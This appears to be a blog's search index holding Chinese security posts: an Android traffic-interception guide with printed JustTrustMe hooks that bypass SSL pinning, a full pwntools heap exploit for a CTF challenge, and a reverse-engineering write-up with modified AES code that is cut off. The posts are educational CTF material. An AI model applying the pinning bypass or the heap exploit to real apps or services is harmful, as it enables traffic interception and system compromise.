{"pages":[{"title":"My Friends","text":"wenzhuan 0x4qE Switch chuj Summer Rogerthat Potat0 Atom Klrin 4nsw3r","link":"/friends/index.html"},{"title":"About me","text":"HDU在读，现在在 Vidar-Team","link":"/about/index.html"}],"posts":[{"title":"安卓抓包总结","text":"关于抓包这一块的总结 [toc] 环境配置 下面环境配置都是在真机上进行的，模拟器同理 Charles 官网下载 Charles 并安装 按提示设置代理并下载根证书到模拟器/真机 ip 和 端口设置成上面提到的，ip 就是本机 ip，注意此时手机与电脑需要在同一个局域网下（比如连接同一个 wifi 或热点），Charles Proxy -&gt; Proxy Settings 内可以修改端口 如需配置抓包 https 可以在 Charles Proxy -&gt;SSL Proxy Settings 添加 443 端口 Android 7.0 以上默认不信任用户安装的证书，为了让我们安装的证书成为系统证书需要安装插件，MagiskTrustUserCerts 这个插件可以让用户证书成为系统信任证书 Burp burp 设置代理，ip 为本机 ip，端口随意 手机跟配置 charles 时一样设置对应的 ip 和端口，同样安装 burp 的 CA 证书到系统证书 抓不到包的情况 比如 OkHttp 中配置 NO_PROXY、curl 发送 http 请求等没有经过系统代理的情况下按之前的抓包方法是抓不到的，需要在手机上通过 VPN 转发后才能抓包 VPN 代理软件有 HttpCanary（直接手机上抓包，个人感觉比较好用） Postern（抓包工具需配置 socks 代理） Drony 绕过 SSL Pinning SSL Pinning 会让我们前面提到的抓包方法失效，绕过后即可正常抓包，在讲 SSL Pinning 前先来了解下加密通信相关的前置知识。 CA 证书 HTTPS 单向验证与双向验证 单向认证 客户端向服务端发送一个明文 http 请求 服务器向客户端发送 CA 证书 客户端收到 CA 证书后用公钥（操作系统和浏览器自带）解密，验证数字签名成功后获得 B_公钥 客户端生成随机数密钥 F，用前面的 B_公钥加密发给服务端 服务端用自己的 B_私钥解密得到 F 之后双方用密钥 F 通信 客户端通过 CA 证书验证服务器，以此防止中间人攻击 双向认证 和单向认证相比，双向认证增加了服务器验证客户端的环节，客户端会发送证书给服务端 SSL pinning 及其实现 SSL Pinning 是一种防止中间人攻击的策略，通过客户端内置证书防范伪造服务器证书，SSL Pinning 分为证书绑定和公钥绑定 证书绑定：客户端代码内置服务端证书的一部分字节码，与服务器通信时会将证书与内置部分比对，不匹配就会报错 公钥绑定：客户端内置证书公钥，通过与服务器证书公钥比对确认连接 HttpsURLConnection 实现 自定义 SSLSocketFactory 实现，继承并重写 TrustManager 的 checkClientTrusted 和 checkServerTrusted 方法 123456789101112131415161718192021222324252627282930313233343536373839public HttpsURLConnection getHttpsURLConnection(String url){ HttpsURLConnection conn = null; try{ SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;); sc.init(null,new TrustManager[]{new MyTrustManager()},new SecureRandom()); HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory()); HttpsURLConnection.setDefaultHostnameVerifier(new MyHostnameVerifier()); conn = (HttpsURLConnection) new URL(url).openConnection(); conn.setDoOutput(true); conn.setDoInput(true); }catch (Exception e){ e.printStackTrace(); } return conn; } class MyHostnameVerifier implements HostnameVerifier{ @Override public boolean verify(String s, SSLSession sslSession) { return true; } } class MyTrustManager implements X509TrustManager{ @Override public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } } OkHttp 实现 CertificatePinner 证书锁定，证书公钥的哈希值可以在这里获取 12345678910111213141516171819202122232425262728293031323334final String CA_DOMAIN =&quot;www.baidu.com&quot;;public void OkHttpCertificatePinner() throws IOException { CertificatePinner certificatePinner = new CertificatePinner.Builder() .add(CA_DOMAIN,&quot;sha256/Zhv4cvwdHmEmE0edWEcIdmLfwsqxrrOmp+vbngwNnrU=&quot;) .add(CA_DOMAIN,&quot;sha256/hETpgVvaLC0bvcGG3t0cuqiHvr4XyP2MTwCiqhgRWwU=&quot;) .add(CA_DOMAIN,&quot;sha256/cGuxAXyFXFkWm61cF4HPWX8S0srS9j0aSqN0k4AP+4A=&quot;) .build(); OkHttpClient client = new OkHttpClient.Builder().certificatePinner(certificatePinner) .build(); Request request = new Request.Builder() .url(&quot;https://www.baidu.com&quot;) .build(); Call call = client.newCall(request); Response response = call.execute(); Log.d(&quot;OkHttp&quot;,response.body().string()); // 异步请求 /* call.enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { Log.d(&quot;OkHttp&quot;, e.getMessage()); } @Override public void onResponse(Call call, okhttp3.Response response) throws IOException { Log.d(&quot;OkHttp&quot;, response.body().string()); } }); */ } 如何绕过 justTrustMe 这一插件能够 hook 掉证书验证从而实现绕过 SSL Pinning，不过 https://github.com/Fuzion24/JustTrustMe Release 里的版本是 2016 年的，需要自己编译一份再使用 当然 justTrustMe 不能绕过所有的 SSL Pinning ，部分魔改的证书校验需要自己写 hook 脚本绕过，因此需要了解下 justTrustMe 都 hook 了哪些函数 justTrustMe 源码分析 这里主要关注 OkHttp，函数 processOkHttp 是来处理 OkHttp 部分的 首先针对 2.5 版本的 okhttp hook 了 com.squareup.okhttp.CertificatePinner.check(String,List)，该方法内对传入的 hostname 的证书和代码内置的公钥哈希做一个匹配，如不匹配则返回 false，这里通过 hook 使其始终返回 true 接下来针对 3.X 版本的 okhttp ，同样 hook 了 okhttp3.CertificatePinner.check(String,List) 始终返回 true，还 hook 了 okhttp3.internal.tls.OkHostnameVerifier.verify 的两个函数，绕过域名校验 4.2.0+ 版本 okhttp 源码改用 kotlin 写，同样hook 了 okhttp3.CertificatePinner.check 三个重载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110void processOkHttp(ClassLoader classLoader) { /* hooking OKHTTP by SQUAREUP */ /* com/squareup/okhttp/CertificatePinner.java available online @ https://github.com/square/okhttp/blob/okhttp_27/okhttp/src/main/java/com/squareup/okhttp/CertificatePinner.java */ /* public void check(String hostname, List&lt;Certificate&gt; peerCertificates) throws SSLPeerUnverifiedException{}*/ /* Either returns true or a exception so blanket return true */ /* Tested against version 2.5 */ Log.d(TAG, &quot;Hooking com.squareup.okhttp.CertificatePinner.check(String,List) (2.5) for: &quot; + currentPackageName); try { classLoader.loadClass(&quot;com.squareup.okhttp.CertificatePinner&quot;); findAndHookMethod(&quot;com.squareup.okhttp.CertificatePinner&quot;, classLoader, &quot;check&quot;, String.class, List.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { return true; } }); } catch (ClassNotFoundException e) { // pass Log.d(TAG, &quot;OKHTTP 2.5 not found in &quot; + currentPackageName + &quot;-- not hooking&quot;); } //https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/CertificatePinner.java#L144 Log.d(TAG, &quot;Hooking okhttp3.CertificatePinner.check(String,List) (3.x) for: &quot; + currentPackageName); try { classLoader.loadClass(&quot;okhttp3.CertificatePinner&quot;); findAndHookMethod(&quot;okhttp3.CertificatePinner&quot;, classLoader, &quot;check&quot;, String.class, List.class, DO_NOTHING); } catch (ClassNotFoundException e) { Log.d(TAG, &quot;OKHTTP 3.x not found in &quot; + currentPackageName + &quot; -- not hooking&quot;); // pass } //https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java try { classLoader.loadClass(&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;); findAndHookMethod(&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;, classLoader, &quot;verify&quot;, String.class, javax.net.ssl.SSLSession.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { return true; } }); } catch (ClassNotFoundException e) { Log.d(TAG, &quot;OKHTTP 3.x not found in &quot; + currentPackageName + &quot; -- not hooking OkHostnameVerifier.verify(String, SSLSession)&quot;); // pass } //https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java try { classLoader.loadClass(&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;); findAndHookMethod(&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;, classLoader, &quot;verify&quot;, String.class, java.security.cert.X509Certificate.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { return true; } }); } catch (ClassNotFoundException e) { Log.d(TAG, &quot;OKHTTP 3.x not found in &quot; + currentPackageName + &quot; -- not hooking OkHostnameVerifier.verify(String, X509)(&quot;); // pass } //https://github.com/square/okhttp/blob/okhttp_4.2.x/okhttp/src/main/java/okhttp3/CertificatePinner.kt Log.d(TAG, &quot;Hooking okhttp3.CertificatePinner.check(String,List) (4.2.0+) for: &quot; + currentPackageName); try { classLoader.loadClass(&quot;okhttp3.CertificatePinner&quot;); findAndHookMethod(&quot;okhttp3.CertificatePinner&quot;, classLoader, &quot;check$okhttp&quot;, String.class, &quot;kotlin.jvm.functions.Function0&quot;, DO_NOTHING); } catch (XposedHelpers.ClassNotFoundError | ClassNotFoundException | NoSuchMethodError e) { Log.d(TAG, &quot;OKHTTP 4.2.0+ (check$okhttp) not found in &quot; + currentPackageName + &quot; -- not hooking&quot;); // pass } try { classLoader.loadClass(&quot;okhttp3.CertificatePinner&quot;); findAndHookMethod(&quot;okhttp3.CertificatePinner&quot;, classLoader, &quot;check&quot;, String.class, List.class, DO_NOTHING); } catch (XposedHelpers.ClassNotFoundError | ClassNotFoundException | NoSuchMethodError e) { Log.d(TAG, &quot;OKHTTP 4.2.0+ (check) not found in &quot; + currentPackageName + &quot; -- not hooking&quot;); // pass } } 这块还是需要看看 OkHttp 源码的 参考 安卓 https 证书校验和绕过 扯一扯HTTPS单向认证、双向认证、抓包原理、反抓包策略 Android安全防护–Volley/OkHttp SSL Pinning","link":"/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/"},{"title":"ida android_server 在 Android10 不显示线程的解决方案","text":"android10 调试遇到的问题 Android 10 或更高版本采用模块化方式来处理一些 Android 系统组件，使其能够在 Android 的常规发布周期外的时间进行更新 ​ 其中 libc.so 被封装到 Runtime 模块 ​ 进程加载的 libc.so 的真实路径应该为 /apex/com.android.runtime/lib/bionic/libc.so ​ android_server 内校验的 libc.so 路径为 /system/lib/libc.so ，可以设置 IDA_LIBC_PATH = /apex/com.android.runtime/lib/bionic/libc.so 解决问题 ​ 当然直接把 android_server 里的校验 patch 掉也行，以 IDA7.5 为例 ​ patch 掉一个 strcmp 就行","link":"/2022/05/06/ida-android-server-%E5%9C%A8-Android10-%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"title":"BUU-ciscn_2019_s_1","text":"复习下 off-by-null 漏洞点 edit 中存在 off-by-null，但是 edit 功能受到次数限制 有 show 功能但是需要 key2 &gt; 0 才能用 限制 edit 和 show 功能的 key1 key2 相邻，可以同时改掉 思路 一次 off-by-null 构造出两个可以 uaf 的堆块 利用 tcache dup 把 key1 key2 都改掉，这样就可以多次调用 edit 并开启 show 功能 利用 show 获得 libc 基址 再次 tcache dup 劫持 __free_hook 为 system （因为第一次 tcache dup 已经把对应大小的 tcache 链表打炸了所以第二次换了个大小） exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#coding:utf8from pwn import *context.log_level='debug'context.terminal = ['tmux','splitw','-h']#r = process(&quot;./ciscn_s_1&quot;)r = remote(&quot;node4.buuoj.cn&quot;,27352)libc = ELF(&quot;./libc-2.27.so&quot;)def add(idx,size,content): r.sendlineafter(&quot;4.show\\n&quot;,&quot;1&quot;) r.sendlineafter(&quot;index:\\n&quot;,str(idx)) r.sendafter(&quot;size:\\n&quot;,str(size)) r.recvuntil(&quot;gift: &quot;) heap_addr = r.recvuntil(&quot;\\n&quot;) r.sendafter(&quot;content:\\n&quot;,content) return heap_addrdef show(index): r.sendlineafter(&quot;4.show\\n&quot;,&quot;4&quot;) r.sendlineafter(&quot;index:&quot;,str(index))def delete(index): r.sendlineafter(&quot;4.show\\n&quot;,&quot;2&quot;) r.sendlineafter(&quot;index:&quot;,str(index))def edit(index,content): r.sendlineafter(&quot;4.show\\n&quot;,&quot;3&quot;) r.sendlineafter(&quot;index:&quot;,str(index)) r.sendafter(&quot;content:\\n&quot;,content)key2_addr = 0x6022B8# chunk overlapping 改 key1 key2for i in range(7): add(i,0xf8,&quot;a&quot;)add(7,0xf8,'0')add(8,0xf8,'1')add(9,0xa8,'2')add(10,0xf8,'3')add(11,0xf8,'/bin/sh\\x00')for i in range(8): delete(i)payload = 'a'*0xa0+p64(0x2b0) #前面堆块大小之和edit(9,payload)delete(10)for i in range(7): add(i,0xf8,&quot;a&quot;)add(12,0xf8,'a')add(13,0xf8,'5')delete(13)delete(8)add(14,0xf8,p64(key2_addr))add(15,0xf8,'6')add(16,0xf8,p32(1)+p32(0x200))# off-by-null double freeshow(12)r.recvuntil(&quot;\\n&quot;)malloc_hook = u64(r.recvuntil(&quot;\\n&quot;).strip(&quot;\\n&quot;).ljust(8,&quot;\\x00&quot;))-0x421-0x10lbase = malloc_hook-libc.sym[&quot;__malloc_hook&quot;]free_hook = lbase+libc.sym[&quot;__free_hook&quot;]system_addr = lbase+libc.sym[&quot;system&quot;]log.success(&quot;libc_base: &quot;+hex(lbase))#gdb.attach(proc.pidof(r)[0])add(17,0xa8,'1')delete(17)delete(9)add(18,0xa8,p64(free_hook))add(19,0xa8,'junk')add(20,0xa8,p64(system_addr))delete(11)r.interactive()","link":"/2022/04/05/BUU-ciscn-2019-s-1/"},{"title":"2022DASCTFxSU三月春季赛login wp","text":"这题好像是 re 的那道 0 解题，赛后自己拿到附件做了一下 大致分析 题目给了两个附件 login 和 check ，login 相当于客户端而 check 相当于服务端进行校验 程序是静态编译的去除了符号信息，为了方便后续分析可以使用 ida 插件 Finger 来识别库函数（结果不一定准确，需要看一下函数内容） login 和 check 两个进程通过 socket 进行通信，下面列出一些 socket 通信的函数的声明及作用 123456789101112131415161718192021222324int socket(int domain, int type, int protocol); //create an endpoint for communicationint listen(int sockfd, int backlog); //listen for connections on a socketint connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);//initiate a connection on a socketint accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);//accept jobs sent to a destinationint bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); //bind a name to a socketssize_t send(int sockfd, const void *buf, size_t len, int flags);ssize_t recv(int sockfd, void *buf, size_t len, int flags);ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);int close(int fd); recvfrom 接收到输入的 token 和 password，只有在 token 和 password 都校验通过的时候才会 check flag check Token gmpz 是一个大数计算库，这里可以看出进行了 c^e%n 的运算（就是 RSA）,如果没有识别函数这里也可以通过数字 0x10001 和 大数猜测出是 RSA 123456789101112void mpz_powm (mpz_ptr r, mpz_srcptr b, mpz_srcptr e, mpz_srcptr m);/*mpz_powm(res,base,exp,mod) -- Set R to (U^E) mod M.*/int mpz_init_set_str (mpz_ptr x, const char *str, int base);/*mpz_init_set_str(string, base) -- Convert the \\0-terminated string STRING in base BASE to a multiple precision integer. Allow white space in the string. If BASE == 0 determine the base in the C standard way, i.e. 0xhh...h means base 16, 0oo...o means base 8, otherwise assume base 10.*/int mpz_cmp (mpz_srcptr u, mpz_srcptr v) /*mpz_cmp(u,v) -- Compare U, V. Return positive, zero, or negative based on if U &gt; V, U == V, or U &lt; V.*/ 用 Rsatools 解一下 check Password 一个矩阵运算，通过 sage 求解，random 得到的值可以自己写一个跑出结果（没有 srand） 123456789101112131415161718#BX=AB=Matrix(Zmod(257),[[113,219,37,46,122,15],[76,163,106,34,170,41],[110,27,169,122,138,39],[47,128,240,14,170,86],[247,89,88,0,169,242],[246,154,78,28,72,201]])A=Matrix(Zmod(257),[[0xa3, 0x97, 0xa2, 0x55, 0x53, 0xbe],[0xf1, 0xfc, 0xf9, 0x79, 0x6b, 0x52], [0x14, 0x13, 0xe9, 0xe2, 0x2d, 0x51], [0x8e, 0x1f, 0x56, 0x8, 0x57, 0x27], [0xa7, 0x5, 0xd4, 0xd0, 0x52, 0x82], [0x77, 0x75, 0x1b, 0x99, 0x4a,0xed]])pwd=B.solve_right(A)'''[ 81 50 210 2 195 45][149 185 249 120 213 20][227 41 66 32 81 59][ 21 98 52 130 180 192][ 46 154 253 232 186 213][236 7 72 106 84 136]'''for i in pwd: for j in i: print(&quot;%02x&quot; %j) check Flag 可以明显看出通过 token 和 password 检查后的第一个 recvfrom 获取的值不是最后输入 flag，转而分析 login，在 login 中 发现发送了一串 16 进制字符串，可以看出是 AES 加密的逆盒 正确的 token 和 pwd 重新组合作为 AES 加密的 key，这里的 AES 是魔改过的所以还需要继续分析 与标准的 AES 进行对照，发现多了个 xor 操作还有把 sub_bytes 替换成了 inv_sub_bytes 整个脚本就不贴了，参考的模板是 https://github.com/dhuertas/AES 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681/* * Addition in GF(2^8) * http://en.wikipedia.org/wiki/Finite_field_arithmetic */uint8_t gadd(uint8_t a, uint8_t b){ return a ^ b;}/* * Subtraction in GF(2^8) * http://en.wikipedia.org/wiki/Finite_field_arithmetic */uint8_t gsub(uint8_t a, uint8_t b){ return a ^ b;}/* * Multiplication in GF(2^8) * http://en.wikipedia.org/wiki/Finite_field_arithmetic * Irreducible polynomial m(x) = x8 + x4 + x3 + x + 1 * * NOTE: This function can be easily replaced with a look up table for a speed * boost, at the expense of an increase in memory size (around 65 KB). See * the aes.h header file to find the macro definition.uint8_t gmult(uint8_t a, uint8_t b) { uint8_t p = 0, i = 0, hbs = 0; for (i = 0; i &lt; 8; i++) { if (b &amp; 1) { p ^= a; } hbs = a &amp; 0x80; a &lt;&lt;= 1; if (hbs) a ^= 0x1b; // 0000 0001 0001 1011 b &gt;&gt;= 1; } return (uint8_t)p;}*//* * Addition of 4 byte words * m(x) = x4+1 */void coef_add(uint8_t a[], uint8_t b[], uint8_t d[]){ d[0] = a[0] ^ b[0]; d[1] = a[1] ^ b[1]; d[2] = a[2] ^ b[2]; d[3] = a[3] ^ b[3];}/* * Multiplication of 4 byte words * m(x) = x4+1 */void coef_mult(uint8_t *a, uint8_t *b, uint8_t *d){ d[0] = gmult(a[0], b[0]) ^ gmult(a[3], b[1]) ^ gmult(a[2], b[2]) ^ gmult(a[1], b[3]); d[1] = gmult(a[1], b[0]) ^ gmult(a[0], b[1]) ^ gmult(a[3], b[2]) ^ gmult(a[2], b[3]); d[2] = gmult(a[2], b[0]) ^ gmult(a[1], b[1]) ^ gmult(a[0], b[2]) ^ gmult(a[3], b[3]); d[3] = gmult(a[3], b[0]) ^ gmult(a[2], b[1]) ^ gmult(a[1], b[2]) ^ gmult(a[0], b[3]);}/* * The cipher Key. */int K;/* * Number of columns (32-bit words) comprising the State. For this * standard, Nb = 4. */const int Nb = 4;/* * Number of 32-bit words comprising the Cipher Key. For this * standard, Nk = 4, 6, or 8. */int Nk;/* * Number of rounds, which is a function of Nk and Nb (which is * fixed). For this standard, Nr = 10, 12, or 14. */int Nr;/* * S-box transformation table */static uint8_t s_box[256] = { // 0 1 2 3 4 5 6 7 8 9 a b c d e f 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}; // f/* * Inverse S-box transformation table */static uint8_t inv_s_box[256] = { // 0 1 2 3 4 5 6 7 8 9 a b c d e f 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}; // f/* * Generates the round constant Rcon[i] */uint8_t R[] = {0x02, 0x00, 0x00, 0x00};uint8_t *Rcon(uint8_t i){ if (i == 1) { R[0] = 0x01; // x^(1-1) = x^0 = 1 } else if (i &gt; 1) { R[0] = 0x02; i--; while (i &gt; 1) { R[0] = gmult(R[0], 0x02); i--; } } return R;}/* * Transformation in the Cipher and Inverse Cipher in which a Round * Key is added to the State using an XOR operation. The length of a * Round Key equals the size of the State (i.e., for Nb = 4, the Round * Key length equals 128 bits/16 bytes). */void add_round_key(uint8_t *state, uint8_t *w, uint8_t r){ uint8_t i; for (i = 0; i &lt; Nb; i++) { for (uint8_t j = 0; j &lt;= 3; j++) { state[4 * i + j] ^= w[4 * j + i]; } }}/* * Transformation in the Cipher that takes all of the columns of the * State and mixes their data (independently of one another) to * produce new columns. */char unknow(uint8_t *w, char state, char matrix){ char result; // al char v4; // al char v5; // al char v6; // al char v7; // al char v8; // al char v9; // bl char v10; // al char v11; // al char v12; // al char v13; // al char v14; // [rsp+1Fh] [rbp-11h] if ( state &gt;= 0 ) result = 2 * state; else result = (2 * state) ^ 0x1B; v14 = result; if ( matrix == 1 ) return state; if ( matrix != 2 ) { switch ( matrix ) { case 3: result ^= state; break; case 4: result = unknow(w, result, 2); break; case 8: v4 = unknow(w, result, 2); result = unknow(w, v4, 2); break; case 9: v5 = unknow(w, result, 2); result = state ^ unknow(w, v5, 2); break; case 10: v6 = unknow(w, result, 2); result = v14 ^ unknow(w, v6, 2); break; case 11: v7 = unknow(w, result, 2); result = state ^ v14 ^ unknow(w, v7, 2); break; case 12: v8 = unknow(w, result, 2); v9 = unknow(w, v8, 2); result = v9 ^ unknow(w, v14, 2); break; case 13: v10 = unknow(w, result, 2); v11 = unknow(w, v10, 2); result = state ^ v11 ^ unknow(w, v14, 2); break; default: v12 = unknow(w, result, 2); v13 = unknow(w, v12, 2); result = v14 ^ v13 ^ unknow(w, v14, 2); break; } } return result;}void mix_columns(uint8_t *w, uint8_t *state){ uint8_t a[] = {0x02, 0x01, 0x01, 0x03}; // a(x) = {02} + {01}x + {01}x2 + {03}x3 uint8_t i, j, col[4], res[4]; for (j = 0; j &lt; Nb; j++) { for (i = 0; i &lt; 4; i++) { col[i] = state[Nb*i+j]; } coef_mult(a, col, res); for (i = 0; i &lt; 4; i++) { state[Nb*i+j] = res[i]; } }}/* * Transformation in the Inverse Cipher that is the inverse of * MixColumns(). */void inv_mix_columns(uint8_t *w ,uint8_t *state){ uint8_t a[] = {0x0e, 0x09, 0x0d, 0x0b}; // a(x) = {0e} + {09}x + {0d}x2 + {0b}x3 uint8_t i, j, col[4], res[4]; for (j = 0; j &lt; Nb; j++) { for (i = 0; i &lt; 4; i++) { col[i] = state[Nb*i+j]; } coef_mult(a, col, res); for (i = 0; i &lt; 4; i++) { state[Nb*i+j] = res[i]; } }}/* * Transformation in the Cipher that processes the State by cyclically * shifting the last three rows of the State by different offsets. */void shift_rows(uint8_t *state){ uint8_t i, k, s, tmp; for (i = 1; i &lt; 4; i++) { s = 0; while (1) { uint8_t v2 = s++; if (!(i &gt; v2)) { break; } tmp = state[Nb * i + 0]; for (k = 1; k &lt; Nb; 